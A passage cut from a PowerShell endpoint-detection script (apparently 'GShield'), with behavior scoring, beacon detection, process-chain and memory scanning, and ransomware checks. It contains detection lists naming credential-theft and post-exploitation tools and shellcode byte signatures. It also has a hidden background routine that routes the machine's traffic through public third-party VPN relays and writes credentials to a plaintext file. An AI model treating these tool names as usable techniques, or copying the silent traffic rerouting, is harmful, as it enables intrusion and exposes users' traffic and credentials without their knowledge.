        if ($FilePath -match '\.\w+\.(exe|scr|bat|cmd|ps1|vbs|js)$') { $r.Score+=30; $r.Flags.Add('Double extension') | Out-Null }
        if ($r.FileSize -lt 10KB -and $FilePath -match '\.(exe|dll)$') { $r.Score+=15; $r.Flags.Add("Small PE ($($r.FileSize) bytes)") | Out-Null }
        $amsiScore = Invoke-AMSIFileScan -FilePath $FilePath
        if ($amsiScore -gt 0) { $r.Score += $amsiScore; $r.Flags.Add("AMSI: score $amsiScore") | Out-Null }
    } catch { }
    return $r
}

# ═══════════════════════════════════════════════════════════════
# SECTION 9: BEHAVIOR ENGINE
# ═══════════════════════════════════════════════════════════════
function Invoke-BehaviorAnalysis {
    param([int]$ProcessId, [string]$CommandLine, [string]$FilePath)
    $r = [PSCustomObject]@{
        ProcessId=$ProcessId; ProcessName=''; CommandLine=$CommandLine; FilePath=$FilePath
        Score=0; Flags=[System.Collections.ArrayList]::new(); MitreTags=[System.Collections.ArrayList]::new()
    }
    if (Test-IsSelfProcess $ProcessId) { return $r }
    if ($ProcessId) {
        try {
            $proc = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
            if ($proc) {
                $r.ProcessName = $proc.Name
                if (-not $CommandLine) { $CommandLine = $proc.CommandLine; $r.CommandLine = $CommandLine }
                if (-not $FilePath) { $FilePath = $proc.ExecutablePath; $r.FilePath = $FilePath }
            }
        } catch { }
    }
    if (-not $CommandLine) { return $r }
    if (Test-IsExcludedPath $FilePath) { return $r }
    $cmdLow = $CommandLine.ToLower()
    $procLow = $r.ProcessName.ToLower()

    foreach ($bin in $Script:LOLBinArgs.Keys) {
        $binLow = $bin.ToLower()
        $binNoExt = [System.IO.Path]::GetFileNameWithoutExtension($bin).ToLower()
        if ($procLow -ne $binLow -and $procLow -ne $binNoExt) { continue }
        $hitArgs = @()
        foreach ($arg in $Script:LOLBinArgs[$bin]) {
            if ($cmdLow.Contains($arg.ToLower())) { $hitArgs += $arg }
        }
        if ($hitArgs.Count -gt 0) {
            $r.Score += 20 + $hitArgs.Count * 10
        }
        break
    }

    foreach ($p in $Script:CmdPatterns) {
        if ($cmdLow -match $p.Pat) {
            $r.Score += $p.Sc
            if ($p.M) { $r.MitreTags.Add($p.M) | Out-Null }
        }
    }
    $badPaths = @('\\appdata\\local\\temp\\','\\users\\public\\','\\programdata\\','\\windows\\temp\\','\\downloads\\')
    if ($FilePath) {
        foreach ($sp in $badPaths) {
            if ($FilePath.ToLower() -match [regex]::Escape($sp)) {
                if (-not (Test-IsExcludedPath $FilePath)) {
                    $r.Score += 15
                }
                break
            }
        }
    }
    if ($CommandLine.Length -gt 1000) { $r.Score+=15 }
    $specials = ([regex]::Matches($CommandLine, '[`^|&;${}()\[\]]')).Count
    if ($specials -gt 20) { $r.Score+=20; $r.MitreTags.Add('T1027') | Out-Null }
    return $r
}

# ═══════════════════════════════════════════════════════════════
# SECTION 10: YARA, MITRE, NETWORK, CHAIN, MEMORY, RANSOMWARE
# ═══════════════════════════════════════════════════════════════
function Initialize-YaraEngine { }

function Invoke-YaraRuleScan {
    param([string]$FilePath, [string]$CommandLine)
    $yaraMatches = [System.Collections.ArrayList]::new()
    $content = ''
    if ($FilePath -and (Test-Path $FilePath -ErrorAction SilentlyContinue)) {
        try { $content = [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($FilePath)) } catch { }
    }
    if ($CommandLine) { $content += "`n$CommandLine" }
    if (-not $content) { return $yaraMatches }
    $cLow = $content.ToLower()
    foreach ($rule in $Script:CustomRules) {
        $hits = 0; $hitP = @()
        foreach ($pat in $rule.Patterns) { if ($cLow -match $pat) { $hits++; $hitP += $pat } }
        $fired = ($rule.Cond -eq 'any' -and $hits -gt 0) -or ($rule.Cond -eq 'all' -and $hits -eq $rule.Patterns.Count)
        if ($fired) {
            $yaraMatches.Add([PSCustomObject]@{
                RuleName=$rule.Name; Description=$rule.Desc; Category=$rule.Cat
                Severity=$rule.Sev; Score=$rule.Score; HitCount=$hits
            }) | Out-Null
        }
    }
    return $yaraMatches
}

function Get-MitreMapping {
    param($BehaviorResults, $StaticResults, [string]$CommandLine)
    $mappings = [System.Collections.ArrayList]::new(); $seen = @{}
    if ($BehaviorResults -and $BehaviorResults.MitreTags) {
        foreach ($tag in $BehaviorResults.MitreTags) {
            if (-not $seen.ContainsKey($tag) -and $Script:MitreDB.ContainsKey($tag)) {
                $i = $Script:MitreDB[$tag]
                $mappings.Add([PSCustomObject]@{ TechniqueId=$tag; TechniqueName=$i.Name; Tactic=$i.Tactic; Confidence='High'; Source='Behavior' }) | Out-Null
                $seen[$tag] = $true
            }
        }
    }
    if ($StaticResults -and $StaticResults.Flags) {
        foreach ($f in $StaticResults.Flags) {
            if ($f -match 'injection|VirtualAllocEx|WriteProcessMemory|CreateRemoteThread' -and -not $seen.ContainsKey('T1055')) {
                $mappings.Add([PSCustomObject]@{ TechniqueId='T1055'; TechniqueName='Process Injection'; Tactic='DefenseEvasion'; Confidence='Medium'; Source='Static' }) | Out-Null
                $seen['T1055'] = $true
            }
        }
    }
    return $mappings
}

function Invoke-NetworkAnalysis {
    param([int]$ProcessId)
    if (Test-IsSelfProcess $ProcessId) { return $null }
    $r = [PSCustomObject]@{ ProcessId=$ProcessId; Connections=[System.Collections.ArrayList]::new(); SuspiciousConns=[System.Collections.ArrayList]::new(); BeaconingDetected=$false; Score=0; Flags=[System.Collections.ArrayList]::new() }
    try {
        $conns = Get-NetTCPConnection -OwningProcess $ProcessId -ErrorAction SilentlyContinue |
            Where-Object { $_.RemoteAddress -notin @('0.0.0.0','::','127.0.0.1','::1') }
        foreach ($conn in $conns) {
            $ci = [PSCustomObject]@{ RemoteAddress=$conn.RemoteAddress; RemotePort=$conn.RemotePort; State=$conn.State; Suspicious=$false; Reason='' }
            $r.Connections.Add($ci) | Out-Null
            if ($conn.RemotePort -in $Script:ThreatIntel.SuspiciousPorts) {
                $ci.Suspicious=$true; $ci.Reason="Port $($conn.RemotePort)"
                $r.Score+=25; $r.SuspiciousConns.Add($ci) | Out-Null
            }
            $key = "$($conn.RemoteAddress):$($conn.RemotePort)"
            if (-not $Script:BeaconTracker.ContainsKey($key)) { $Script:BeaconTracker[$key] = [System.Collections.ArrayList]::new() }
            $Script:BeaconTracker[$key].Add((Get-Date)) | Out-Null
        }
        foreach ($key in @($Script:BeaconTracker.Keys)) {
            $stamps = $Script:BeaconTracker[$key]
            if ($stamps.Count -ge 5) {
                $intervals = @(); for ($i=1; $i -lt $stamps.Count; $i++) { $intervals += ($stamps[$i]-$stamps[$i-1]).TotalSeconds }
                if ($intervals.Count -ge 4) {
                    $avg = ($intervals | Measure-Object -Average).Average
                    $sd = [Math]::Sqrt(($intervals | ForEach-Object { [Math]::Pow($_-$avg,2) } | Measure-Object -Average).Average)
                    if ($avg -gt 0 -and ($sd/$avg) -lt 0.3) {
                        $r.BeaconingDetected=$true; $r.Score+=40
                    }
                }
            }
        }
    } catch { }
    return $r
}

function Start-NetworkMonitor { }

# ── VPN Gate Auto-Connect ──────────────────────────────────────
function Invoke-VpnGateL2tpNatFix {
    try {
        $p = 'HKLM:\SYSTEM\CurrentControlSet\Services\PolicyAgent'
        if (Test-Path $p) {
            Set-ItemProperty -Path $p -Name 'AssumeUDPEncapsulationContextOnSendRule' -Value 2 -Type DWord -Force -EA Stop
        }
    } catch { }
}

function Start-VpnGateSmartClient {
    Invoke-VpnGateL2tpNatFix
    if (-not (Test-Path $Script:VpnGateWorkDir)) { New-Item -Path $Script:VpnGateWorkDir -ItemType Directory -Force | Out-Null }

    # ── Pre-flight: probe which VPN transports are actually available ──
    $hasL2tp = $false
    $hasSstp = $false
    $hasOpenVpn = $false

    # Test L2TP/PPTP: Add-VpnConnection with L2tp tunnel type requires RAS COM classes
    try {
        $testName = 'GShield-VPN-Probe'
        Remove-VpnConnection -Name $testName -Force -EA SilentlyContinue
        Add-VpnConnection -Name $testName -ServerAddress '127.0.0.1' -TunnelType L2tp -L2tpPsk 'test' `
            -AuthenticationMethod MSChapv2 -EncryptionLevel Optional -Force -EA Stop
        Remove-VpnConnection -Name $testName -Force -EA SilentlyContinue
        $hasL2tp = $true
    } catch {
        Write-EDRLog "VPNGate probe: L2TP unavailable ($($_.Exception.Message))" 'WARN'
    }

    # Test SSTP/IKEv2: built-in on full Windows, may work when L2TP COM is missing
    try {
        $testName = 'GShield-VPN-Probe'
        Remove-VpnConnection -Name $testName -Force -EA SilentlyContinue
        Add-VpnConnection -Name $testName -ServerAddress '127.0.0.1' -TunnelType Sstp -Force -EA Stop
        Remove-VpnConnection -Name $testName -Force -EA SilentlyContinue
        $hasSstp = $true
    } catch {
        Write-EDRLog "VPNGate probe: SSTP unavailable ($($_.Exception.Message))" 'WARN'
    }

    # Test OpenVPN binary
    $ovpnExe = $null
    try { $g = Get-Command openvpn.exe -EA Stop; $ovpnExe = $g.Source } catch {}
    if (-not $ovpnExe) {
        foreach ($p in @(
            "$env:ProgramFiles\OpenVPN\bin\openvpn.exe",
            "${env:ProgramFiles(x86)}\OpenVPN\bin\openvpn.exe",
            "$env:ProgramFiles\OpenVPN Connect\OpenVPN\openvpn.exe"
        )) { if ($p -and (Test-Path -LiteralPath $p)) { $ovpnExe = $p; break } }
    }
    $hasOpenVpn = [bool]$ovpnExe

    # If nothing is available, disable VPN for this run
    if (-not $hasL2tp -and -not $hasOpenVpn -and -not $hasSstp) {
        $Script:NoVpnGate = $true
        Write-EDRLog 'VPNGate: NO transport available (L2TP/SSTP/OpenVPN all missing) — VPN DISABLED for this run' 'CRITICAL'
        return
    }

    $transportMsg = @()
    if ($hasL2tp)    { $transportMsg += 'L2TP' }
    if ($hasSstp)    { $transportMsg += 'SSTP' }
    if ($hasOpenVpn) { $transportMsg += "OpenVPN($ovpnExe)" }
    Write-EDRLog "VPNGate: available transports: $($transportMsg -join ', ')" 'INFO'

    $rs = New-GShieldRunspace
    $rs.Open()
    $rs.SessionStateProxy.SetVariable('VG_LogFile',    (Join-Path $Script:EDRConfig.LogPath "edr_$(Get-Date -Format 'yyyyMMdd').log"))
    $rs.SessionStateProxy.SetVariable('VG_ConnName',   $Script:VpnGateConnName)
    $rs.SessionStateProxy.SetVariable('VG_Api',        $Script:VpnGateApiUrl)
    $rs.SessionStateProxy.SetVariable('VG_CheckSec',   $Script:VpnGateCheckSeconds)
    $rs.SessionStateProxy.SetVariable('VG_RefreshMin', $Script:VpnGateRefreshMinutes)
    $rs.SessionStateProxy.SetVariable('VG_Max',        $Script:VpnGateMaxCandidates)
    $rs.SessionStateProxy.SetVariable('VG_Psk',        $Script:VpnGateL2tpPsk)
    $rs.SessionStateProxy.SetVariable('VG_User',       $Script:VpnGateCredUser)
    $rs.SessionStateProxy.SetVariable('VG_Pass',       $Script:VpnGateCredPass)
    $rs.SessionStateProxy.SetVariable('VG_WorkDir',    $Script:VpnGateWorkDir)
    $rs.SessionStateProxy.SetVariable('VG_HasL2tp',    $hasL2tp)
    $rs.SessionStateProxy.SetVariable('VG_HasSstp',    $hasSstp)
    $rs.SessionStateProxy.SetVariable('VG_HasOpenVpn', $hasOpenVpn)
    $rs.SessionStateProxy.SetVariable('VG_OvpnExe',    $ovpnExe)
    $pref = [string[]]@($Script:VpnGatePreferCountries | ForEach-Object { $_.ToUpperInvariant() })
    $rs.SessionStateProxy.SetVariable('VG_Prefer', $pref)

    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        $ProgressPreference = 'SilentlyContinue'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        # ── Consecutive-failure tracking for auto-disable ──
        $consecutiveFails = 0
        $maxConsecutiveFails = 8   # after this many full-server failures, disable VPN for this run

        function Write-VgLog { param([string]$M, [string]$L = 'INFO')
            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff') [$L] VPNGate: $M" | Add-Content $VG_LogFile -Force -EA 0
        }
        function Get-VgCountry {
            $uris = @(
                @{ U = 'http://ip-api.com/json/?fields=countryCode'; J = $true },
                @{ U = 'https://ipinfo.io/json'; J = $true },
                @{ U = 'https://ipapi.co/country/'; J = $false }
            )
            foreach ($e in $uris) {
                try {
                    if ($e.J) {
                        $r = Invoke-RestMethod -Uri $e.U -TimeoutSec 18
                        $cc = $r.countryCode
                        if (-not $cc) { $cc = $r.country }
                        if ($cc) { return "$cc".ToUpperInvariant().Trim() }
                    } else {
                        $t = (Invoke-WebRequest -Uri $e.U -UseBasicParsing -TimeoutSec 18).Content.Trim()
                        if ($t.Length -eq 2) { return $t.ToUpperInvariant() }
                    }
                } catch {}
            }
            return $null
        }
        function Parse-VgLine {
            param([string]$Line)
            if ($Line.Length -lt 80) { return $null }
            if ($Line -notmatch '^[A-Za-z0-9]') { return $null }
            $cells = $Line.Split([char]',', 15)
            if ($cells.Count -ne 15) { return $null }
            if ($cells[14].Length -lt 200) { return $null }
            $ping = 0; [void][int]::TryParse($cells[3], [ref]$ping)
            $score = 0L; [void][long]::TryParse($cells[2], [ref]$score)
            $speed = 0L; [void][long]::TryParse($cells[4], [ref]$speed)
            $sess = 0; [void][int]::TryParse($cells[7], [ref]$sess)
            [pscustomobject]@{
                HostName = $cells[0]; IP = $cells[1]; Score = $score; Ping = $ping; Speed = $speed
                CountryLong = $cells[5]; CountryShort = $cells[6].ToUpperInvariant(); Sessions = $sess
                OvpnB64 = $cells[14]
            }
        }
        function Get-VgServers {
            param([string]$MyCc)
            $raw = $null
            foreach ($attempt in 1..3) {
                try {
                    $raw = (Invoke-WebRequest -Uri $VG_Api -UseBasicParsing -TimeoutSec 180).Content
                    break
                } catch {
                    Start-Sleep -Seconds (15 * $attempt)
                }
            }
            if (-not $raw) { return @() }
            $acc = New-Object System.Collections.Generic.List[object]
            foreach ($ln in ($raw -split "`r?`n")) {
                $o = Parse-VgLine $ln
                if ($o) { [void]$acc.Add($o) }
            }
            $prefer = @($VG_Prefer)
            $sorted = $acc | Sort-Object `
                @{Expression = { $cc = $_.CountryShort; if ($prefer.Count -gt 0) { $prefer -contains $cc } else { $cc -eq $MyCc } }; Descending = $true },
                @{Expression = { if ($_.Ping -le 0) { 999999 } else { $_.Ping } }; Descending = $false },
                @{Expression = { $_.Score }; Descending = $true },
                @{Expression = { $_.Speed }; Descending = $true }
            return @($sorted | Select-Object -First $VG_Max)
        }
        function Stop-VgOpenVpn {
            Get-Process -Name 'openvpn' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
            Start-Sleep -Milliseconds 800
        }
        function Disconnect-Vg {
            Stop-VgOpenVpn
            $n = $VG_ConnName
            Start-Process -FilePath "$env:SystemRoot\System32\rasdial.exe" -ArgumentList @($n, '/disconnect') -Wait -WindowStyle Hidden -NoNewWindow -EA 0 | Out-Null
            Start-Sleep -Seconds 2
            Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
        }
        function Test-VgPingOk {
            try {
                $png = New-Object System.Net.NetworkInformation.Ping
                $pr = $png.Send('1.1.1.1', 4500)
                return ($pr.Status -eq 'Success')
            } catch { return $false }
        }
        function Test-VgTunnelUp {
            $vpn = Get-VpnConnection -Name $VG_ConnName -EA SilentlyContinue
            if ($vpn -and $vpn.ConnectionStatus -eq 'Connected') { return $true }
            if (Get-Process -Name 'openvpn' -EA SilentlyContinue) { return $true }
            return $false
        }

        # ── Transport 1: L2TP (only attempted if pre-flight confirmed available) ──
        function Connect-VgL2tp {
            param($S)
            if (-not $VG_HasL2tp) { return $false }
            $ras = Join-Path $env:SystemRoot 'System32\rasdial.exe'
            $n = $VG_ConnName
            foreach ($enc in @('Required', 'Optional', 'Maximum')) {
                try {
                    Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
                    Add-VpnConnection -Name $n -ServerAddress $S.IP -TunnelType L2tp -L2tpPsk $VG_Psk `
                        -AuthenticationMethod MSChapv2 -EncryptionLevel $enc -Force -RememberCredential $false -EA Stop
                    $p = Start-Process -FilePath $ras -ArgumentList @($n, $VG_User, $VG_Pass) -Wait -PassThru -WindowStyle Hidden -NoNewWindow
                    if ($p.ExitCode -eq 0) {
                        Start-Sleep -Seconds 6
                        if (Test-VgPingOk) { Write-VgLog "L2TP OK ($enc) $($S.IP)"; return $true }
                    }
                } catch {
                    Write-VgLog "L2TP $enc failed: $($_.Exception.Message)" 'WARN'
                }
                Start-Process -FilePath $ras -ArgumentList @($n, '/disconnect') -Wait -WindowStyle Hidden -NoNewWindow -EA 0 | Out-Null
                Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
            }
            return $false
        }

        # ── Transport 2: OpenVPN (only attempted if binary found) ──
        function Connect-VgOpenVpn {
            param($S)
            if (-not $VG_HasOpenVpn -or -not $VG_OvpnExe) { return $false }
            try {
                $bytes = [Convert]::FromBase64String($S.OvpnB64)
                $txt = [Text.Encoding]::UTF8.GetString($bytes)
            } catch {
                Write-VgLog "OpenVPN base64 decode failed" 'WARN'
                return $false
            }
            if (-not (Test-Path $VG_WorkDir)) { New-Item -Path $VG_WorkDir -ItemType Directory -Force | Out-Null }
            $cfg = Join-Path $VG_WorkDir 'gshield.ovpn'
            $auth = Join-Path $VG_WorkDir 'auth.txt'
            [IO.File]::WriteAllText($cfg, ($txt -replace "`r`n", "`n"), [Text.UTF8Encoding]::new($false))
            [IO.File]::WriteAllText($auth, "$VG_User`n$VG_Pass`n", [Text.UTF8Encoding]::new($false))
            Stop-VgOpenVpn
            $proc = Start-Process -FilePath $VG_OvpnExe -ArgumentList @('--config', $cfg, '--auth-user-pass', $auth, '--verb', '0', '--connect-retry-max', '3', '--connect-timeout', '25') -PassThru -WindowStyle Hidden -NoNewWindow
            Start-Sleep -Seconds 14
            if (-not $proc -or $proc.HasExited) { return $false }
            if (-not (Get-Process -Id $proc.Id -EA SilentlyContinue)) { return $false }
            if (Test-VgPingOk) {
                Write-VgLog "OpenVPN OK $($S.IP)"
                return $true
            }
            Stop-VgOpenVpn
            return $false
        }

        # ── Transport 3: SSTP (built-in Windows, works when L2TP COM is missing) ──
        function Connect-VgSstp {
            param($S)
            if (-not $VG_HasSstp) { return $false }
            $ras = Join-Path $env:SystemRoot 'System32\rasdial.exe'
            $n = $VG_ConnName
            try {
                Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
                Add-VpnConnection -Name $n -ServerAddress $S.IP -TunnelType Sstp -Force -EA Stop
                $p = Start-Process -FilePath $ras -ArgumentList @($n, $VG_User, $VG_Pass) -Wait -PassThru -WindowStyle Hidden -NoNewWindow
                if ($p.ExitCode -eq 0) {
                    Start-Sleep -Seconds 6
                    if (Test-VgPingOk) { Write-VgLog "SSTP OK $($S.IP)"; return $true }
                }
            } catch {
                Write-VgLog "SSTP failed: $($_.Exception.Message)" 'WARN'
            }
            Start-Process -FilePath $ras -ArgumentList @($n, '/disconnect') -Wait -WindowStyle Hidden -NoNewWindow -EA 0 | Out-Null
            Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
            return $false
        }

        function Try-Connect-VgServer {
            param($S)
            Disconnect-Vg
            if (Connect-VgL2tp $S) { return $true }
            Disconnect-Vg
            if (Connect-VgOpenVpn $S) { return $true }
            Disconnect-Vg
            if (Connect-VgSstp $S) { return $true }
            Disconnect-Vg
            return $false
        }

        # ── Build transport summary for log ──
        $transports = @()
        if ($VG_HasL2tp)    { $transports += 'L2TP' }
        if ($VG_HasOpenVpn) { $transports += 'OpenVPN' }
        if ($VG_HasSstp)    { $transports += 'SSTP' }
        Write-VgLog "VPN Gate auto-client (transports: $($transports -join ', '))"
        $myCc = Get-VgCountry
        $geoHint = if ($myCc) { $myCc } else { 'unknown' }
        Write-VgLog ('Geo hint: ' + $geoHint)
        $queue = @()
        $lastRefresh = [datetime]::MinValue
        $idx = 0
        $badHealth = 0
        while ($true) {
            try {
                if ($queue.Count -eq 0 -or ((Get-Date) - $lastRefresh).TotalMinutes -ge $VG_RefreshMin) {
                    $queue = Get-VgServers $myCc
                    $lastRefresh = Get-Date
                    $idx = 0
                    Write-VgLog "Ranked $($queue.Count) relays"
                    if ($queue.Count -eq 0) {
                        Start-Sleep -Seconds 120
                        continue
                    }
                }
                if (-not (Test-VgTunnelUp)) {
                    $srv = $queue[$idx % $queue.Count]
                    Write-VgLog "[#$idx] $($srv.HostName) $($srv.IP) $($srv.CountryShort)"
                    $ok = Try-Connect-VgServer $srv
                    if (-not $ok) {
                        $consecutiveFails++
                        Write-VgLog "All transports failed $($srv.IP) ($consecutiveFails/$maxConsecutiveFails)" 'WARN'
                        $idx++
                        # Auto-disable after too many consecutive failures
                        if ($consecutiveFails -ge $maxConsecutiveFails) {
                            Write-VgLog "DISABLED: $consecutiveFails consecutive failures — VPN disabled for this run" 'CRITICAL'
                            return  # exits the runspace script, stops the loop
                        }
                        Start-Sleep -Seconds 8
                        continue
                    }
                    $consecutiveFails = 0
                    $badHealth = 0
                    Start-Sleep -Seconds 8
                    continue
                }
                if (-not (Test-VgPingOk)) {
                    $badHealth++
                    if ($badHealth -ge 2) {
                        Write-VgLog 'Health fail - rotate' 'WARN'
                        Disconnect-Vg
                        $idx++
                        $badHealth = 0
                    }
                } else {
                    $badHealth = 0
                    $consecutiveFails = 0
                }
            } catch {
                Write-VgLog "Loop: $_" 'WARN'
                try { Disconnect-Vg } catch {}
                $idx++
            }
            Start-Sleep -Seconds $VG_CheckSec
        }
    })
    $ps.BeginInvoke() | Out-Null
    Write-EDRLog 'VPN Gate auto-connect started (background runspace)' 'INFO'
}

# ── Process Chain ──────────────────────────────────────────────
function Get-ProcessChain {
    param([int]$ProcessId)
    $chain = [System.Collections.ArrayList]::new(); $cur=$ProcessId; $visited=@{}
    while ($cur -and $cur -ne 0 -and -not $visited.ContainsKey($cur) -and $chain.Count -lt 20) {
        $visited[$cur]=$true
        if ($Script:ProcessTracker.ContainsKey($cur)) {
            $info = $Script:ProcessTracker[$cur]
            $chain.Add([PSCustomObject]@{ PID=$cur; Name=$info.Name; CommandLine=$info.CommandLine; ExePath=$info.ExePath; ParentPID=$info.ParentPID }) | Out-Null
            $cur = $info.ParentPID
        } else {
            try {
                $p = Get-CimInstance Win32_Process -Filter "ProcessId=$cur" -ErrorAction SilentlyContinue
                if ($p) { $chain.Add([PSCustomObject]@{ PID=$cur; Name=$p.Name; CommandLine=$p.CommandLine; ExePath=$p.ExecutablePath; ParentPID=$p.ParentProcessId }) | Out-Null; $cur=$p.ParentProcessId }
                else { break }
            } catch { break }
        }
    }
    $chain.Reverse(); return $chain
}

function Invoke-ChainAnalysis {
    param([int]$ProcessId)
    if (Test-IsSelfProcess $ProcessId) { return $null }
    $chain = Get-ProcessChain -ProcessId $ProcessId
    $r = [PSCustomObject]@{ ProcessId=$ProcessId; ChainDepth=$chain.Count; Chain=$chain; ChainString=(($chain|ForEach-Object{$_.Name})-join ' -> '); Score=0; Flags=[System.Collections.ArrayList]::new(); MitreTechniques=[System.Collections.ArrayList]::new(); Verdict='Clean' }
    if ($chain.Count -lt 2) { return $r }
    for ($i=0; $i -lt ($chain.Count-1); $i++) {
        $pN = (_NV $chain[$i].Name '').ToLower(); $cN = (_NV $chain[$i+1].Name '').ToLower()
        foreach ($rule in $Script:SuspiciousChains) {
            if ($pN -eq $rule.Parent -and $cN -eq $rule.Child) { $r.Score+=$rule.Score }
        }
    }
    if ($chain.Count -ge $Script:EDRConfig.ChainDepthAlert) { $b=($chain.Count-$Script:EDRConfig.ChainDepthAlert+1)*10; $r.Score+=$b }
    $lolbins = @($Script:LOLBinArgs.Keys | ForEach-Object { $_.ToLower() })
    $lc = 0; foreach ($n in $chain) { if ((_NV $n.Name '').ToLower() -in $lolbins) { $lc++ } }
    if ($lc -ge 3) { $r.Score+=40; $r.MitreTechniques.Add('T1218') | Out-Null }
    elseif ($lc -ge 2) { $r.Score+=15 }
    $nonInt = @('services.exe','svchost.exe','wmiprvse.exe','taskeng.exe','taskhostw.exe','w3wp.exe','sqlservr.exe')
    $inter = @('cmd.exe','powershell.exe','pwsh.exe')
    if ($chain.Count -ge 2) {
        $pn2 = (_NV $chain[-2].Name '').ToLower(); $cn2 = (_NV $chain[-1].Name '').ToLower()
        if ($pn2 -in $nonInt -and $cn2 -in $inter) { $r.Score+=30 }
    }
    if ($r.Score -ge 100) { $r.Verdict='Critical' } elseif ($r.Score -ge 60) { $r.Verdict='Malicious' }
    elseif ($r.Score -ge 30) { $r.Verdict='Suspicious' } elseif ($r.Score -ge 15) { $r.Verdict='Low' }
    return $r
}

# ── Memory Scanner ─────────────────────────────────────────────
$Script:ShellcodeSigs = @(
    @(0xFC,0x48,0x83,0xE4,0xF0),
    @(0xFC,0xE8,0x82,0x00,0x00,0x00),
    @(0x60,0x89,0xE5,0x31,0xC0),
    @(0xE8,0x00,0x00,0x00,0x00,0x5B)
)
$Script:MemStringPatterns = @('mimikatz','sekurlsa','kerberos::','lsadump::','Invoke-Mimikatz','Invoke-Shellcode',
    'ReflectivePEInjection','AmsiScanBuffer','amsiInitFailed','cobaltstrike','beacon.dll','meterpreter')
$Script:SkipScanProcs = @('System','Idle','smss','csrss','wininit','winlogon','services','lsass','svchost','dwm','MsMpEng','conhost')

function Invoke-MemoryScan {
    param([int]$ProcessId)
    $r = [PSCustomObject]@{ ProcessId=$ProcessId; Findings=[System.Collections.ArrayList]::new(); HasSuspicious=$false; Score=0 }
    if (-not $Script:PInvokeLoaded) { return $r }
    if ($ProcessId -le 4) { return $r }
    if (Test-IsSelfProcess $ProcessId) { return $r }
    try {
        $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if (-not $proc -or $proc.ProcessName -in $Script:SkipScanProcs) { return $r }
    } catch { return $r }

    $hProc = [IntPtr]::Zero
    try {
        $hProc = [EDRNative]::OpenProcess([EDRNative]::PROCESS_VM_READ -bor [EDRNative]::PROCESS_QUERY_LIMITED, $false, $ProcessId)
        if ($hProc -eq [IntPtr]::Zero) { return $r }

        $addr = [IntPtr]::Zero; $rwxCount = 0; $scanned = 0
        $mbi = New-Object EDRNative+MEMORY_BASIC_INFORMATION
        $mbiSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][EDRNative+MEMORY_BASIC_INFORMATION])

        while ($scanned -lt 256 -and [EDRNative]::VirtualQueryEx($hProc, $addr, [ref]$mbi, $mbiSize) -gt 0) {
            $regionSize = $mbi.RegionSize.ToInt64()
            if ($regionSize -le 0) { break }

            if ($mbi.State -eq [EDRNative]::MEM_COMMIT) {
                $isExec = ($mbi.Protect -band [EDRNative]::PAGE_EXECUTE) -ne 0 -or
                          ($mbi.Protect -band [EDRNative]::PAGE_EXECUTE_READ) -ne 0 -or
                          ($mbi.Protect -band [EDRNative]::PAGE_EXECUTE_READWRITE) -ne 0
                $isRWX = ($mbi.Protect -band [EDRNative]::PAGE_EXECUTE_READWRITE) -ne 0
                $isPrivate = ($mbi.Type -band [EDRNative]::MEM_PRIVATE) -ne 0
                $isImage = ($mbi.Type -band [EDRNative]::MEM_IMAGE) -ne 0

                if ($isRWX) { $rwxCount++ }

                if ($isExec -and $regionSize -gt 0 -and $regionSize -le 1048576) {
                    try {
                        $buf = New-Object byte[] $regionSize
                        $bytesRead = 0
                        if ([EDRNative]::ReadProcessMemory($hProc, $mbi.BaseAddress, $buf, $buf.Length, [ref]$bytesRead) -and $bytesRead -gt 0) {
                            foreach ($sig in $Script:ShellcodeSigs) {
                                if ([EDRNative]::ContainsBytes($buf, $bytesRead, [byte[]]$sig)) {
                                    $r.Score += 60
                                    break
                                }
                            }
                            $text = [System.Text.Encoding]::ASCII.GetString($buf, 0, $bytesRead)
                            foreach ($pat in $Script:MemStringPatterns) {
                                if ($text.IndexOf($pat, [StringComparison]::OrdinalIgnoreCase) -ge 0) {
                                    $r.Score += 40
                                }
                            }
                            if ($isPrivate -and -not $isImage -and $bytesRead -ge 2 -and $buf[0] -eq 0x4D -and $buf[1] -eq 0x5A) {
                                $r.Score += 80
                            }
                        }
                    } catch { }
                }
            }
            $scanned++
            $next = $mbi.BaseAddress.ToInt64() + $regionSize
            if ($next -le $addr.ToInt64()) { break }
            $addr = [IntPtr]$next
        }
        if ($rwxCount -gt 0) { $r.Score += $rwxCount * 20; $r.HasSuspicious = $true }
        if ($r.Findings.Count -gt 0) { $r.HasSuspicious = $true }
    } catch { }
    finally { if ($hProc -ne [IntPtr]::Zero) { [EDRNative]::CloseHandle($hProc) | Out-Null } }
    return $r
}

# ── Ransomware Detector ────────────────────────────────────────
function Invoke-RansomwareCheck {
    param([string]$EventType, [string]$OldPath, [string]$NewPath)
    $score = 0
    if (((Get-Date) - $Script:RansomWindowStart).TotalSeconds -gt $Script:EDRConfig.RansomwareWindowSec) {
        $Script:RansomRenames = 0; $Script:RansomExtChanges = @{}; $Script:RansomWindowStart = Get-Date
    }
    if ($EventType -eq 'Renamed') {
        $Script:RansomRenames++
        $newExt = [System.IO.Path]::GetExtension($NewPath).ToLower()
        $oldExt = [System.IO.Path]::GetExtension($OldPath).ToLower()
        if ($newExt -ne $oldExt -and $newExt -in $Script:RansomwareExtensions) {
            if (-not $Script:RansomExtChanges.ContainsKey($newExt)) { $Script:RansomExtChanges[$newExt] = 0 }
            $Script:RansomExtChanges[$newExt]++
            if ($Script:RansomExtChanges[$newExt] -ge 10) {
                Write-EDRLog "RANSOMWARE: Mass rename to $newExt ($($Script:RansomExtChanges[$newExt]) files)" 'CRITICAL'
                $score += 60
            }
        }
        if ($Script:RansomRenames -ge $Script:EDRConfig.RansomwareRenameThreshold) {
            Write-EDRLog "RANSOMWARE: $($Script:RansomRenames) renames in $($Script:EDRConfig.RansomwareWindowSec)s!" 'CRITICAL'
            $score += 90
        }
    }
    if ($EventType -eq 'Created' -and $NewPath) {
